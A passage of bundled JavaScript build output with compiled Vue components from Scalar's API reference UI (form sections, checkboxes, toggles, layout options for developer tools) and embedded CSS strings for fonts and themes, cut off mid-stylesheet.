						_cache[0] || (_cache[0] = createBaseVNode("br", null, null, -1)),
						createTextVNode(" " + toDisplayString(unref(translate)("developerTools.additionalFeaturesMightRequire")) + " ", 1),
						_cache[1] || (_cache[1] = createBaseVNode("span", null, [createBaseVNode("a", {
							href: "https://scalar.com/products/docs/getting-started",
							rel: "noopener noreferrer",
							target: "_blank"
						}, " Scalar Pro. ")], -1))
					]),
					_: 1
				})
			], 64);
		};
	}
});
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarForm/ScalarFormField.vue.script.js
var _hoisted_1$11 = {
	key: 0,
	class: "flex items-start justify-between gap-2 text-sm/none text-c-1 whitespace-nowrap font-medium"
};
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarForm/ScalarFormField.vue.js
var ScalarFormField_default = /* @__PURE__ */ defineComponent({
	inheritAttrs: false,
	__name: "ScalarFormField",
	props: { is: { default: "label" } },
	setup(__props) {
		const { cx } = useBindCx();
		return (_ctx, _cache) => {
			return openBlock(), createBlock(resolveDynamicComponent(__props.is), normalizeProps$1(guardReactiveProps(unref(cx)("flex flex-col gap-1.5 rounded"))), {
				default: withCtx(() => [
					_ctx.$slots.label ? (openBlock(), createElementBlock("div", _hoisted_1$11, [renderSlot(_ctx.$slots, "label")])) : createCommentVNode("", true),
					renderSlot(_ctx.$slots, "default"),
					_ctx.$slots.below ? (openBlock(), createElementBlock("span", {
						key: 1,
						class: normalizeClass(unref(cx)("-mt-1.5 text-sm"))
					}, [renderSlot(_ctx.$slots, "below")], 2)) : createCommentVNode("", true)
				]),
				_: 3
			}, 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarForm/ScalarFormInputGroup.vue.js
var ScalarFormInputGroup_default = /* @__PURE__ */ defineComponent({
	inheritAttrs: false,
	__name: "ScalarFormInputGroup",
	props: { is: { default: "div" } },
	setup(__props) {
		const { cx } = useBindCx();
		useFormGroup();
		return (_ctx, _cache) => {
			return openBlock(), createBlock(resolveDynamicComponent(__props.is), normalizeProps$1(guardReactiveProps(unref(cx)("flex flex-col border rounded divide-y"))), {
				default: withCtx(() => [renderSlot(_ctx.$slots, "default")]),
				_: 3
			}, 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarForm/ScalarFormSection.vue.script.js
/**
* Scalar Form Section component
*
* A collection of form fields grouped together with a title.
*
* @example
*   <ScalarFormSection>
*     <template #label>Section Label</template>
*     <!-- Section content -->
*   </ScalarFormSection>
*/
var ScalarFormSection_vue_vue_type_script_lang_default = {};
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarForm/ScalarFormSection.vue.js
var _hoisted_1$10 = { class: "flex min-w-0 flex-col gap-3" };
var _hoisted_2$6 = { class: "contents" };
var _hoisted_3$3 = { class: "text-base font-medium text-c-1" };
function _sfc_render(_ctx, _cache, $props, $setup, $data, $options) {
	return openBlock(), createElementBlock("fieldset", _hoisted_1$10, [createBaseVNode("legend", _hoisted_2$6, [createBaseVNode("span", _hoisted_3$3, [renderSlot(_ctx.$slots, "label")])]), renderSlot(_ctx.$slots, "default")]);
}
var ScalarFormSection_default = /*#__PURE__*/ _plugin_vue_export_helper_default(ScalarFormSection_vue_vue_type_script_lang_default, [["render", _sfc_render]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/DeployApiReference.vue.script.js
var _hoisted_1$9 = { class: "text-c-2 mb-2 leading-normal" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/DeployApiReference.vue.js
var DeployApiReference_default = /* @__PURE__ */ defineComponent({
	__name: "DeployApiReference",
	props: {
		workspace: {},
		externalUrls: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		return (_ctx, _cache) => {
			return openBlock(), createBlock(ApiReferenceToolbarPopover_default, { class: "w-120" }, {
				label: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.deploy")), 1)]),
				default: withCtx(() => [createVNode(unref(ScalarFormSection_default), null, {
					label: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.scalarDocs")), 1)]),
					default: withCtx(() => [createBaseVNode("p", _hoisted_1$9, toDisplayString(unref(translate)("developerTools.deployDescription")), 1), createVNode(ApiReferenceToolbarShareRegister_default, {
						externalUrls: __props.externalUrls,
						workspace: __props.workspace
					}, null, 8, ["externalUrls", "workspace"])]),
					_: 1
				})]),
				_: 1
			});
		};
	}
});
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarCheckboxInput/ScalarCheckbox.vue.js
var ScalarCheckbox_default = /* @__PURE__ */ defineComponent({
	__name: "ScalarCheckbox",
	props: {
		selected: { type: Boolean },
		indeterminate: {
			type: Boolean,
			default: false
		},
		type: { default: "checkbox" }
	},
	setup(__props) {
		const props = __props;
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", { class: normalizeClass(["flex size-4 items-center justify-center p-0.75", [props.selected ? "bg-c-accent text-b-1" : props.indeterminate && props.type === "checkbox" ? "bg-c-accent text-b-1" : "text-transparent shadow-border", props.type === "checkbox" ? "rounded" : "rounded-full"]]) }, [props.selected ? (openBlock(), createBlock(unref(ScalarIconCheck_default), {
				key: 0,
				class: "size-3",
				weight: "bold"
			})) : props.indeterminate && props.type === "checkbox" ? (openBlock(), createBlock(unref(ScalarIconMinus_default), {
				key: 1,
				"aria-hidden": "true",
				class: "size-3",
				weight: "bold"
			})) : createCommentVNode("", true)], 2);
		};
	}
});
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarCheckboxInput/ScalarCheckboxInput.vue.script.js
var _hoisted_1$8 = { class: "flex-1 text-left min-w-0 truncate" };
var _hoisted_2$5 = ["type"];
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarCheckboxInput/ScalarCheckboxInput.vue.js
var ScalarCheckboxInput_default = /* @__PURE__ */ defineComponent({
	inheritAttrs: false,
	__name: "ScalarCheckboxInput",
	props: /*@__PURE__*/ mergeModels({
		type: { default: "checkbox" },
		indeterminate: {
			type: Boolean,
			default: false
		}
	}, {
		"modelValue": { type: Boolean },
		"modelModifiers": {}
	}),
	emits: ["update:modelValue"],
	setup(__props) {
		const props = __props;
		const model = useModel(__props, "modelValue");
		const { stylingAttrsCx, otherAttrs } = useBindCx();
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(ScalarFormInput_default), mergeProps({ is: "label" }, unref(stylingAttrsCx)("cursor-pointer gap-2 hover:bg-b-2", { "text-c-1": model.value })), {
				default: withCtx(() => [
					createVNode(ScalarCheckbox_default, {
						class: "shrink-0",
						indeterminate: props.indeterminate && props.type === "checkbox",
						selected: model.value,
						type: props.type
					}, null, 8, [
						"indeterminate",
						"selected",
						"type"
					]),
					createBaseVNode("div", _hoisted_1$8, [renderSlot(_ctx.$slots, "default")]),
					withDirectives(createBaseVNode("input", mergeProps({
						ref: "inputEl",
						"onUpdate:modelValue": _cache[0] || (_cache[0] = ($event) => model.value = $event),
						class: "sr-only",
						type: props.type
					}, unref(otherAttrs)), null, 16, _hoisted_2$5), [[vModelDynamic, model.value]])
				]),
				_: 3
			}, 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarCheckboxInput/ScalarCheckboxRadioGroup.vue.js
var ScalarCheckboxRadioGroup_default = /* @__PURE__ */ defineComponent({
	__name: "ScalarCheckboxRadioGroup",
	props: /*@__PURE__*/ mergeModels({ options: { default: () => [] } }, {
		"modelValue": {},
		"modelModifiers": {}
	}),
	emits: ["update:modelValue"],
	setup(__props) {
		const model = useModel(__props, "modelValue");
		const name = useId();
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(ScalarFormInputGroup_default), null, {
				default: withCtx(() => [(openBlock(true), createElementBlock(Fragment, null, renderList(__props.options, (option) => {
					return openBlock(), createBlock(ScalarCheckboxInput_default, {
						key: option.value,
						modelValue: model.value?.value === option.value,
						name: unref(name),
						type: "radio",
						value: option.value,
						"onUpdate:modelValue": (checked) => model.value = checked ? option : void 0
					}, {
						default: withCtx(() => [createTextVNode(toDisplayString(option.label), 1)]),
						_: 2
					}, 1032, [
						"modelValue",
						"name",
						"value",
						"onUpdate:modelValue"
					]);
				}), 128))]),
				_: 1
			});
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ApiReferenceToolbarConfigLayout.vue.js
var ApiReferenceToolbarConfigLayout_default = /* @__PURE__ */ defineComponent({
	__name: "ApiReferenceToolbarConfigLayout",
	props: {
		"modelValue": {},
		"modelModifiers": {}
	},
	emits: ["update:modelValue"],
	setup(__props) {
		const model = useModel(__props, "modelValue");
		const { translate } = useLocalization();
		const options = computed(() => [{
			label: translate("developerTools.layoutModern"),
			value: "modern"
		}, {
			label: translate("developerTools.layoutClassic"),
			value: "classic"
		}]);
		const selected = computed({
			get: () => options.value.find((option) => option.value === model.value) ?? options.value[0],
			set: (option) => model.value = option.value
		});
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(ScalarCheckboxRadioGroup_default), {
				modelValue: selected.value,
				"onUpdate:modelValue": _cache[0] || (_cache[0] = ($event) => selected.value = $event),
				options: options.value
			}, null, 8, ["modelValue", "options"]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarToggle/ScalarToggleSlider.vue.script.js
var _hoisted_1$7 = ["aria-disabled"];
var _hoisted_2$4 = {
	key: 0,
	class: "sr-only"
};
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarToggle/ScalarToggleSlider.vue.js
var ScalarToggleSlider_default = /* @__PURE__ */ defineComponent({
	inheritAttrs: false,
	__name: "ScalarToggleSlider",
	props: {
		thumb: { default: "start" },
		disabled: { type: Boolean },
		label: {}
	},
	setup(__props) {
		const variants = cva({
			base: "relative h-3.5 min-w-6 w-6 cursor-pointer rounded-full bg-b-3 transition-colors duration-300",
			variants: { disabled: { true: "cursor-not-allowed opacity-40" } }
		});
		const { cx } = useBindCx();
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("button", mergeProps({
				"aria-disabled": __props.disabled,
				type: "button"
			}, unref(cx)(unref(variants)({ disabled: __props.disabled }))), [createBaseVNode("div", { class: normalizeClass(["absolute left-px top-px flex h-3 w-3 items-center justify-center rounded-full bg-b-1 transition-transform duration-300", {
				"translate-x-1.25": __props.thumb === "center",
				"translate-x-2.5": __props.thumb === "end"
			}]) }, null, 2), __props.label ? (openBlock(), createElementBlock("span", _hoisted_2$4, toDisplayString(__props.label), 1)) : createCommentVNode("", true)], 16, _hoisted_1$7);
		};
	}
});
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarToggle/ScalarToggle.vue.js
var ScalarToggle_default = /* @__PURE__ */ defineComponent({
	__name: "ScalarToggle",
	props: /*@__PURE__*/ mergeModels({
		disabled: { type: Boolean },
		label: {}
	}, {
		"modelValue": {
			type: Boolean,
			default: false
		},
		"modelModifiers": {}
	}),
	emits: ["update:modelValue"],
	setup(__props) {
		const props = __props;
		const model = useModel(__props, "modelValue");
		function toggle() {
			if (props.disabled) return;
			model.value = !model.value;
		}
		return (_ctx, _cache) => {
			return openBlock(), createBlock(ScalarToggleSlider_default, {
				"aria-checked": model.value,
				class: normalizeClass(model.value ? "bg-c-accent" : ""),
				disabled: __props.disabled,
				label: __props.label,
				role: "switch",
				thumb: model.value ? "end" : "start",
				onClick: toggle
			}, null, 8, [
				"aria-checked",
				"class",
				"disabled",
				"label",
				"thumb"
			]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarToggle/ScalarToggleInput.vue.script.js
var _hoisted_1$6 = { class: "flex-1 text-left min-w-0 truncate" };
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarToggle/ScalarToggleInput.vue.js
var ScalarToggleInput_default = /* @__PURE__ */ defineComponent({
	inheritAttrs: false,
	__name: "ScalarToggleInput",
	props: {
		"modelValue": { type: Boolean },
		"modelModifiers": {}
	},
	emits: ["update:modelValue"],
	setup(__props) {
		const model = useModel(__props, "modelValue");
		const { stylingAttrsCx, otherAttrs } = useBindCx();
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(ScalarFormInput_default), mergeProps({ is: "label" }, unref(stylingAttrsCx)("cursor-pointer gap-2 hover:bg-b-2", { "text-c-1": model.value })), {
				default: withCtx(() => [createBaseVNode("div", _hoisted_1$6, [renderSlot(_ctx.$slots, "default")]), createVNode(ScalarToggle_default, mergeProps({
					modelValue: model.value,
					"onUpdate:modelValue": _cache[0] || (_cache[0] = ($event) => model.value = $event),
					class: "shrink-0"
				}, unref(otherAttrs)), null, 16, ["modelValue"])]),
				_: 3
			}, 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/developer-tools/components/ApiReferenceToolbarConfigLayoutOptions.vue.js
var ApiReferenceToolbarConfigLayoutOptions_default = /* @__PURE__ */ defineComponent({
	__name: "ApiReferenceToolbarConfigLayoutOptions",
	props: /*@__PURE__*/ mergeModels({ configuration: {} }, {
		"modelValue": { default: () => ({}) },
		"modelModifiers": {}
	}),
	emits: ["update:modelValue"],
	setup(__props) {
		const model = useModel(__props, "modelValue");
		const { translate } = useLocalization();
		function getValue(key, defaultValue = false) {
			return model.value[key] ?? __props.configuration?.[key] ?? defaultValue;
		}
		function setValue(key, value, defaultValue = false) {
			if (value !== defaultValue) model.value = {
				...model.value,
				[key]: value
			};
			else model.value = Object.fromEntries(Object.entries(model.value).filter(([k]) => key !== k));
		}
		const modelsSectionLabel = computed(() => __props.configuration?.modelsSectionLabel ?? "Models");
		const expandAllModelsLabel = computed(() => translate("developerTools.expandAll", { label: modelsSectionLabel.value }));
		const hideModelsLabel = computed(() => translate("developerTools.hideModels", { label: modelsSectionLabel.value }));
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(ScalarFormInputGroup_default), null, {
				default: withCtx(() => [
					createVNode(unref(ScalarToggleInput_default), {
						modelValue: getValue("showSidebar", true),
						"onUpdate:modelValue": _cache[0] || (_cache[0] = (v) => setValue("showSidebar", !!v, true))
					}, {
						default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.showSidebar")), 1)]),
						_: 1
					}, 8, ["modelValue"]),
					createVNode(unref(ScalarToggleInput_default), {
						modelValue: getValue("defaultOpenFirstTag", true),
						"onUpdate:modelValue": _cache[1] || (_cache[1] = (v) => setValue("defaultOpenFirstTag", !!v, true))
					}, {
						default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.defaultOpenFirstTag")), 1)]),
						_: 1
					}, 8, ["modelValue"]),
					createVNode(unref(ScalarToggleInput_default), {
						modelValue: getValue("defaultOpenAllTags"),
						"onUpdate:modelValue": _cache[2] || (_cache[2] = (v) => setValue("defaultOpenAllTags", !!v))
					}, {
						default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.defaultOpenAllTags")), 1)]),
						_: 1
					}, 8, ["modelValue"]),
					createVNode(unref(ScalarToggleInput_default), {
						modelValue: getValue("expandAllModelSections"),
						"onUpdate:modelValue": _cache[3] || (_cache[3] = (v) => setValue("expandAllModelSections", !!v))
					}, {
						default: withCtx(() => [createTextVNode(toDisplayString(expandAllModelsLabel.value), 1)]),
						_: 1
					}, 8, ["modelValue"]),
					createVNode(unref(ScalarToggleInput_default), {
						modelValue: getValue("expandAllResponses"),
						"onUpdate:modelValue": _cache[4] || (_cache[4] = (v) => setValue("expandAllResponses", !!v))
					}, {
						default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.expandAllResponses")), 1)]),
						_: 1
					}, 8, ["modelValue"]),
					createVNode(unref(ScalarToggleInput_default), {
						modelValue: getValue("hideClientButton"),
						"onUpdate:modelValue": _cache[5] || (_cache[5] = (v) => setValue("hideClientButton", !!v))
					}, {
						default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.hideClientButton")), 1)]),
						_: 1
					}, 8, ["modelValue"]),
					createVNode(unref(ScalarToggleInput_default), {
						modelValue: getValue("hideDarkModeToggle"),
						"onUpdate:modelValue": _cache[6] || (_cache[6] = (v) => setValue("hideDarkModeToggle", !!v))
					}, {
						default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.hideDarkModeToggle")), 1)]),
						_: 1
					}, 8, ["modelValue"]),
					createVNode(unref(ScalarToggleInput_default), {
						modelValue: getValue("hideModels"),
						"onUpdate:modelValue": _cache[7] || (_cache[7] = (v) => setValue("hideModels", !!v))
					}, {
						default: withCtx(() => [createTextVNode(toDisplayString(hideModelsLabel.value), 1)]),
						_: 1
					}, 8, ["modelValue"]),
					createVNode(unref(ScalarToggleInput_default), {
						modelValue: getValue("hideSearch"),
						"onUpdate:modelValue": _cache[8] || (_cache[8] = (v) => setValue("hideSearch", !!v))
					}, {
						default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.hideSearch")), 1)]),
						_: 1
					}, 8, ["modelValue"]),
					createVNode(unref(ScalarToggleInput_default), {
						modelValue: getValue("showOperationId"),
						"onUpdate:modelValue": _cache[9] || (_cache[9] = (v) => setValue("showOperationId", !!v))
					}, {
						default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.showOperationId")), 1)]),
						_: 1
					}, 8, ["modelValue"]),
					createVNode(unref(ScalarToggleInput_default), {
						modelValue: getValue("hideTestRequestButton"),
						"onUpdate:modelValue": _cache[10] || (_cache[10] = (v) => setValue("hideTestRequestButton", !!v))
					}, {
						default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("developerTools.hideTestRequestButton")), 1)]),
						_: 1
					}, 8, ["modelValue"])
				]),
				_: 1
			});
		};
	}
});
//#endregion
//#region node_modules/@scalar/themes/dist/index.js
var fonts_default = "/* Inter (--scalar-font) */\n/* cyrillic-ext */\n@font-face {\n  font-family: \"Inter\";\n  font-style: normal;\n  font-weight: 100 900;\n  font-display: swap;\n  src: url(https://fonts.scalar.com/inter-cyrillic-ext.woff2) format(\"woff2\");\n  unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;\n}\n/* cyrillic */\n@font-face {\n  font-family: \"Inter\";\n  font-style: normal;\n  font-weight: 100 900;\n  font-display: swap;\n  src: url(https://fonts.scalar.com/inter-cyrillic.woff2) format(\"woff2\");\n  unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;\n}\n/* greek-ext */\n@font-face {\n  font-family: \"Inter\";\n  font-style: normal;\n  font-weight: 100 900;\n  font-display: swap;\n  src: url(https://fonts.scalar.com/inter-greek-ext.woff2) format(\"woff2\");\n  unicode-range: U+1F00-1FFF;\n}\n/* greek */\n@font-face {\n  font-family: \"Inter\";\n  font-style: normal;\n  font-weight: 100 900;\n  font-display: swap;\n  src: url(https://fonts.scalar.com/inter-greek.woff2) format(\"woff2\");\n  unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;\n}\n/* vietnamese */\n@font-face {\n  font-family: \"Inter\";\n  font-style: normal;\n  font-weight: 100 900;\n  font-display: swap;\n  src: url(https://fonts.scalar.com/inter-vietnamese.woff2) format(\"woff2\");\n  unicode-range:\n    U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169,\n    U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323,\n    U+0329, U+1EA0-1EF9, U+20AB;\n}\n/* latin-ext */\n@font-face {\n  font-family: \"Inter\";\n  font-style: normal;\n  font-weight: 100 900;\n  font-display: swap;\n  src: url(https://fonts.scalar.com/inter-latin-ext.woff2) format(\"woff2\");\n  unicode-range:\n    U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F,\n    U+A720-A7FF;\n}\n/* latin */\n@font-face {\n  font-family: \"Inter\";\n  font-style: normal;\n  font-weight: 100 900;\n  font-display: swap;\n  src: url(https://fonts.scalar.com/inter-latin.woff2) format(\"woff2\");\n  unicode-range:\n    U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA,\n    U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191,\n    U+2193, U+2212, U+2215, U+FEFF, U+FFFD;\n}\n\n/* keyboard symbols (←↑→↓↵⇧⇪⌘⌥) */\n@font-face {\n  font-family: \"Inter\";\n  font-style: normal;\n  font-weight: 100 900;\n  font-display: swap;\n  src: url(https://fonts.scalar.com/inter-symbols.woff2) format(\"woff2\");\n  unicode-range: U+2190-2193, U+21B5, U+21E7, U+21EA, U+2318, U+2325;\n}\n\n/* JetBrains Mono (--scalar-font-code) */\n/* cyrillic-ext */\n@font-face {\n  font-family: \"JetBrains Mono\";\n  font-style: normal;\n  font-weight: 400;\n  src: url(https://fonts.scalar.com/mono-cyrillic-ext.woff2) format(\"woff2\");\n  unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;\n}\n/* cyrillic */\n@font-face {\n  font-family: \"JetBrains Mono\";\n  font-style: normal;\n  font-weight: 400;\n  src: url(https://fonts.scalar.com/mono-cyrillic.woff2) format(\"woff2\");\n  unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;\n}\n/* greek */\n@font-face {\n  font-family: \"JetBrains Mono\";\n  font-style: normal;\n  font-weight: 400;\n  src: url(https://fonts.scalar.com/mono-greek.woff2) format(\"woff2\");\n  unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;\n}\n/* vietnamese */\n@font-face {\n  font-family: \"JetBrains Mono\";\n  font-style: normal;\n  font-weight: 400;\n  src: url(https://fonts.scalar.com/mono-vietnamese.woff2) format(\"woff2\");\n  unicode-range:\n    U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169,\n    U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323,\n    U+0329, U+1EA0-1EF9, U+20AB;\n}\n/* latin-ext */\n@font-face {\n  font-family: \"JetBrains Mono\";\n  font-style: normal;\n  font-weight: 400;\n  src: url(https://fonts.scalar.com/mono-latin-ext.woff2) format(\"woff2\");\n  unicode-range:\n    U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F,\n    U+A720-A7FF;\n}\n/* latin */\n@font-face {\n  font-family: \"JetBrains Mono\";\n  font-style: normal;\n  font-weight: 400;\n  src: url(https://fonts.scalar.com/mono-latin.woff2) format(\"woff2\");\n  unicode-range:\n    U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA,\n    U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191,\n    U+2193, U+2212, U+2215, U+FEFF, U+FFFD;\n}\n";
var alternate_default = "/* basic theme */\n:root {\n  --scalar-text-decoration: underline;\n  --scalar-text-decoration-hover: underline;\n}\n\n.dark-mode {\n  --scalar-background-1: #131313;\n  --scalar-background-2: #1d1d1d;\n  --scalar-background-3: #272727;\n  --scalar-background-card: #1d1d1d;\n\n  --scalar-color-1: rgba(255, 255, 255, 0.9);\n  --scalar-color-2: rgba(255, 255, 255, 0.62);\n  --scalar-color-3: rgba(255, 255, 255, 0.44);\n\n  --scalar-color-accent: var(--scalar-color-1);\n  --scalar-background-accent: var(--scalar-background-3);\n\n  --scalar-border-color: #2a2b2a;\n}\n\n.light-mode,\n.light-mode .dark-mode {\n  --scalar-background-1: #f9f9f9;\n  --scalar-background-2: #f1f1f1;\n  --scalar-background-3: #e7e7e7;\n  --scalar-background-card: #fff;\n\n  --scalar-color-1: #1b1b1b;\n  --scalar-color-2: #757575;\n  --scalar-color-3: #8e8e8e;\n\n  --scalar-color-accent: var(--scalar-color-1);\n  --scalar-background-accent: var(--scalar-background-3);\n\n  --scalar-border-color: rgba(0, 0, 0, 0.1);\n}\n\n/* Document Sidebar */\n.t-doc__sidebar {\n  --scalar-color-green: var(--scalar-color-1);\n  --scalar-color-red: var(--scalar-color-1);\n  --scalar-color-yellow: var(--scalar-color-1);\n  --scalar-color-blue: var(--scalar-color-1);\n  --scalar-color-orange: var(--scalar-color-1);\n  --scalar-color-purple: var(--scalar-color-1);\n  --scalar-color-query: var(--scalar-color-1);\n}\n\n.light-mode .t-doc__sidebar,\n.dark-mode .t-doc__sidebar {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n\n  --scalar-sidebar-item-hover-background: var(--scalar-background-2);\n  --scalar-sidebar-item-hover-color: currentColor;\n\n  --scalar-sidebar-item-active-background: var(--scalar-background-accent);\n  --scalar-sidebar-color-active: var(--scalar-color-accent);\n\n  --scalar-sidebar-search-background: transparent;\n  --scalar-sidebar-search-color: var(--scalar-color-3);\n  --scalar-sidebar-search-border-color: var(--scalar-border-color);\n}\n/* advanced */\n.light-mode .dark-mode,\n.light-mode {\n  --scalar-color-green: #069061;\n  --scalar-color-red: #ef0006;\n  --scalar-color-yellow: #edbe20;\n  --scalar-color-blue: #0082d0;\n  --scalar-color-orange: #fb892c;\n  --scalar-color-purple: #5203d1;\n  --scalar-color-query: #007b80;\n\n  --scalar-button-1: rgba(0, 0, 0, 1);\n  --scalar-button-1-hover: rgba(0, 0, 0, 0.8);\n  --scalar-button-1-color: #fff;\n}\n.dark-mode {\n  --scalar-color-green: #00b648;\n  --scalar-color-red: #dd2f2c;\n  --scalar-color-yellow: #ffc90d;\n  --scalar-color-blue: #4eb3ec;\n  --scalar-color-orange: #ff8d4d;\n  --scalar-color-purple: #b191f9;\n  --scalar-color-query: #65d4cf;\n\n  --scalar-button-1: rgba(255, 255, 255, 1);\n  --scalar-button-1-hover: rgba(255, 255, 255, 0.9);\n  --scalar-button-1-color: black;\n}\n\n.scalar-api-client__item,\n.scalar-card,\n.dark-mode .dark-mode.scalar-card {\n  --scalar-background-1: var(--scalar-background-card);\n  --scalar-background-2: var(--scalar-background-1);\n  --scalar-background-3: var(--scalar-background-1);\n}\n.dark-mode .dark-mode.scalar-card {\n  --scalar-background-3: var(--scalar-background-3);\n}\n\n.light-mode *::selection {\n  background-color: color-mix(in srgb, var(--scalar-color-blue), transparent 70%);\n}\n.dark-mode *::selection {\n  background-color: color-mix(in srgb, var(--scalar-color-blue), transparent 50%);\n}\n";
var bluePlanet_default = "/* basic theme */\n:root {\n  --scalar-text-decoration: underline;\n  --scalar-text-decoration-hover: underline;\n}\n.light-mode {\n  --scalar-background-1: #f0f2f5;\n  --scalar-background-2: #eaecf0;\n  --scalar-background-3: #e0e2e6;\n  --scalar-border-color: rgb(213 213 213);\n\n  --scalar-color-1: rgb(9, 9, 11);\n  --scalar-color-2: rgb(113, 113, 122);\n  --scalar-color-3: rgba(25, 25, 28, 0.5);\n\n  --scalar-color-accent: var(--scalar-color-1);\n  --scalar-background-accent: #8ab4f81f;\n}\n.light-mode .scalar-card.dark-mode,\n.dark-mode {\n  --scalar-background-1: #000e23;\n  --scalar-background-2: #01132e;\n  --scalar-background-3: #03193b;\n  --scalar-border-color: #2e394c;\n\n  --scalar-color-1: #fafafa;\n  --scalar-color-2: rgb(161, 161, 170);\n  --scalar-color-3: rgba(255, 255, 255, 0.533);\n\n  --scalar-color-accent: var(--scalar-color-1);\n  --scalar-background-accent: #8ab4f81f;\n\n  --scalar-code-language-color-supersede: var(--scalar-color-1);\n}\n/* Document Sidebar */\n.light-mode .t-doc__sidebar,\n.dark-mode .t-doc__sidebar {\n  --scalar-sidebar-background-1: var(--scalar-background-1);\n  --scalar-sidebar-color-1: var(--scalar-color-1);\n  --scalar-sidebar-color-2: var(--scalar-color-2);\n  --scalar-sidebar-border-color: var(--scalar-border-color);\n\n  --scalar-sidebar-item-hover-background: var(--scalar-background-2);\n  --scalar-sidebar-item-hover-color: currentColor;\n\n  --scalar-sidebar-item-active-background: var(--scalar-background-3);\n  --scalar-sidebar-color-active: var(--scalar-color-accent);\n\n  --scalar-sidebar-search-background: rgba(255, 255, 255, 0.1);\n  --scalar-sidebar-search-border-color: var(--scalar-border-color);\n  --scalar-sidebar-search-color: var(--scalar-color-3);\n  z-index: 1;\n}\n.light-mode .t-doc__sidebar {\n  --scalar-sidebar-search-background: white;\n}\n/* advanced */\n.light-mode {\n  --scalar-color-green: #069061;\n  --scalar-color-red: #ef0006;\n  --scalar-color-yellow: #edbe20;\n  --scalar-color-blue: #0082d0;\n  --scalar-color-orange: #fb892c;\n  --scalar-color-purple: #5203d1;\n  --scalar-color-query: #007b80;\n\n  --scalar-button-1: rgba(0, 0, 0, 1);\n  --scalar-button-1-hover: rgba(0, 0, 0, 0.8);\n  --scalar-button-1-color: #fff;\n}\n.dark-mode {\n  --scalar-color-green: rgba(69, 255, 165, 0.823);\n  --scalar-color-red: #ff8589;\n  --scalar-color-yellow: #ffcc4d;\n  --scalar-color-blue: #6bc1fe;\n  --scalar-color-orange: #f98943;\n  --scalar-color-purple: #b191f9;\n  --scalar-color-query: #79e2da;\n\n  --scalar-button-1: rgba(255, 255, 255, 1);\n  --scalar-button-1-hover: rgba(255, 255, 255, 0.9);\n  --scalar-button-1-color: black;\n}\n/* Custom theme */\n/* Document header */\n@keyframes headerbackground {\n  from {\n    background: transparent;\n    backdrop-filter: none;\n  }\n  to {\n    background: var(--scalar-header-background-1);\n    backdrop-filter: blur(12px);\n  }\n}\n\n.light-mode .t-doc__header,\n.dark-mode .t-doc__header {\n  animation: headerbackground 